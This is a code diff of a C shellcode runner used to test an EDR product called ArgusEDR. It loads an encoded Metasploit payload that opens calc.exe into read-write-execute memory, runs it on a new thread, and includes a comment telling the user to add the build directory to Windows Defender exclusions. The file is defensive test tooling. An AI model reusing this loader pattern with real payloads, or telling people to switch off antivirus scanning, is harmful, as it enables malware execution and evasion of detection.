@@ -2,38 +2,28 @@
  * shellcode_runner.c
  * Shellcode loader for ArgusEDR E2E testing.
  *
- * Executes a Metasploit windows/x64/exec CMD=calc.exe payload to verify
- * the full detection pipeline:
- *
- *   VirtualAlloc  (PAGE_EXECUTE_READWRITE) ? hook event ? scan trigger
- *   memcpy        (shellcode written)
- *   CreateThread  (shellcode executed)    ? hook event ? CRITICAL verdict
- *   calc.exe opens — visible confirmation shellcode ran
+ * Allocates RWX memory, copies a Metasploit calc.exe payload via memcpy,
+ * then executes it on a new thread â€” mimicking real-world in-process shellcode
+ * execution without any WriteProcessMemory calls.
  *
  * Workflow:
  *   1. Start argus_agent.exe
  *   2. Start shellcode_runner.exe  (note the printed PID)
- *   3. Run: injector.exe <PID> argus_hook.dll
- *   4. Run: injector.exe <PID> argus_pesieve.dll
- *   5. Press ENTER — shellcode allocates + copies
- *   6. Press ENTER again — shellcode executes on a new thread
- *   7. calc.exe opens; ArgusAgent should log:
- *        hook event: VirtualAlloc protect=64 (RWX)
- *        FINDING_PRIVATE_EXECUTABLE
- *        hook event: CreateThread
- *        PROCESS_VERDICT severity:CRITICAL
+ *   3. Inject:  injector.exe <PID> argus_hook.dll
+ *               injector.exe <PID> argus_pesieve.dll
+ *   4. Press ENTER  â€” shellcode is allocated + copied
+ *   5. Press ENTER  â€” shellcode thread is created; calc.exe opens
  *
  * !! WARNING !!
- * This payload launches calc.exe and is structurally identical to a real
- * Metasploit stager. Windows Defender WILL flag it. Add the build output
- * directory to Defender exclusions before running, or use a dedicated VM.
+ * The payload is structurally identical to a Metasploit stager.
+ * Add the build directory to Defender exclusions before running.
  */
 
 #include <windows.h>
 #include <stdio.h>
 
- /* msfvenom -p windows/x64/exec CMD=calc.exe -f c -b '\x00' */
- /* Generated: x64/xor encoder, 319 bytes                     */
+/* msfvenom -p windows/x64/exec CMD=calc.exe -f c -b '\x00' */
+/* Generated: x64/xor encoder, 319 bytes                     */
 unsigned char buf[] =
 "\x48\x31\xc9\x48\x81\xe9\xdd\xff\xff\xff\x48\x8d\x05\xef"
 "\xff\xff\xff\x48\xbb\x9a\xcc\xb7\xa9\x14\xae\x10\x6a\x48"
@@ -61,74 +51,41 @@ unsigned char buf[] =
 
 int main(void)
 {
-    printf("============================================\n");
-    printf("  ArgusEDR Shellcode Runner — calc.exe\n");
-    printf("============================================\n");
-    printf("[runner] PID = %lu\n", GetCurrentProcessId());
-    printf("\n");
-    printf("[runner] Step 1: start argus_agent.exe in another terminal\n");
-    printf("[runner] Step 2: inject both DLLs:\n");
-    printf("           injector.exe %lu argus_hook.dll\n", GetCurrentProcessId());
-    printf("           injector.exe %lu argus_pesieve.dll\n", GetCurrentProcessId());
-    printf("\n");
-    printf("[runner] Press ENTER after injection to allocate + copy shellcode...\n");
+    DWORD pid = GetCurrentProcessId();
+    printf("  ArgusEDR  /  Shellcode Runner\n");
+    printf("  ----------------------------------------\n");
+    printf("  PID    %lu\n", pid);
+    printf("  Inject injector.exe %lu argus_hook.dll\n", pid);
+    printf("         injector.exe %lu argus_pesieve.dll\n\n", pid);
+    printf("  Press ENTER after injection...\n");
     getchar();
 
-    /* ?? Step 1: VirtualAlloc RWX ??????????????????????????????????????????? */
-    /* PAGE_EXECUTE_READWRITE in one shot — the classic red flag.              */
-    /* argus_hook.dll intercepts this ? sends hook event ? agent enqueues      */
-    /* a scan trigger ? scanner finds FINDING_PRIVATE_EXECUTABLE.             */
-    printf("[runner] Calling VirtualAlloc (RWX, %zu bytes)...\n", sizeof(buf));
     LPVOID lpShellcode = VirtualAlloc(
         NULL, sizeof(buf),
         MEM_COMMIT | MEM_RESERVE,
         PAGE_EXECUTE_READWRITE);
-
     if (!lpShellcode) {
-        fprintf(stderr, "[runner] VirtualAlloc failed: %lu\n", GetLastError());
+        fprintf(stderr, "  ERROR  VirtualAlloc failed (%lu)\n", GetLastError());
         return 1;
     }
-    printf("[runner] Allocated at %p\n", lpShellcode);
 
-    /* ?? Step 2: copy shellcode ????????????????????????????????????????????? */
     memcpy(lpShellcode, buf, sizeof(buf));
-    printf("[runner] Shellcode copied (%zu bytes).\n", sizeof(buf));
 
-    printf("\n");
-    printf("[runner] Press ENTER to execute shellcode (calc.exe will open)...\n");
+    printf("  Press ENTER to execute...\n");
     getchar();
 
-    /* ?? Step 3: CreateThread ? execute shellcode ??????????????????????????? */
-    /* argus_hook.dll intercepts CreateThread ? correlator sets                */
-    /* has_remote_thread = true ? SEVERITY_CRITICAL verdict emitted.          */
-    printf("[runner] Calling CreateThread at %p...\n", lpShellcode);
     HANDLE hThread = CreateThread(
         NULL, 0,
         (LPTHREAD_START_ROUTINE)lpShellcode,
         NULL, 0, NULL);
-
     if (!hThread) {
-        fprintf(stderr, "[runner] CreateThread failed: %lu\n", GetLastError());
+        fprintf(stderr, "  ERROR  CreateThread failed (%lu)\n", GetLastError());
         VirtualFree(lpShellcode, 0, MEM_RELEASE);
         return 1;
     }
 
-    printf("[runner] Thread created — waiting for shellcode to finish...\n");
     WaitForSingleObject(hThread, 5000);
     CloseHandle(hThread);
-
-    printf("\n");
-    printf("[runn2er] Done. Check ArgusAgent output for:\n");
-    printf("           hook event: VirtualAlloc protect=64 (RWX)\n");
-    printf("           FINDING_PRIVATE_EXECUTABLE\n");
-    printf("           hook event: CreateThread\n");
-    printf("           PROCESS_VERDICT severity:CRITICAL\n");
-    printf("\n");
-    printf("[runner] Press ENTER to free memory and exit.\n");
-    getchar();
-
-
     VirtualFree(lpShellcode, 0, MEM_RELEASE);
-    printf("[runner] Cleaned up. Goodbye.\n");
     return 0;
 }
